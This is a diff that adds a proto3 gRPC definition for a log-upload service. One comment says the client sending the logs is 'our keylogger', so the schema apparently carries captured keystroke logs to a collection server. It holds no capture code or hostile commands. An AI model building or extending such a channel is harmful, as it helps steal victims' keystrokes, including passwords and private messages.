@@ -1,0 +1,24 @@
+syntax = "proto3";
+// using proto3 language version 
+
+package log_service;
+// naming the package to avoid collision when importing this file
+
+//Defining the message sent from client to server
+message SendLogRequest {
+  string log_content = 1;    // the entire log file in a string
+  string client_id = 2;     // A unique identifier for the client (AKA our keylogger)
+}
+
+//Message returned from server to client 
+message SendLogResponse {
+  bool success = 1;   // default is false btw      
+  string message = 2;  // A brief status message    
+}
+
+//service definition  (the set of remote methods)
+// We'll use a Unary RPC for a simple "request-response" pattern.
+service LogService {
+  //method to send log data to the server
+  rpc UploadLog (SendLogRequest) returns (SendLogResponse) {}
+}
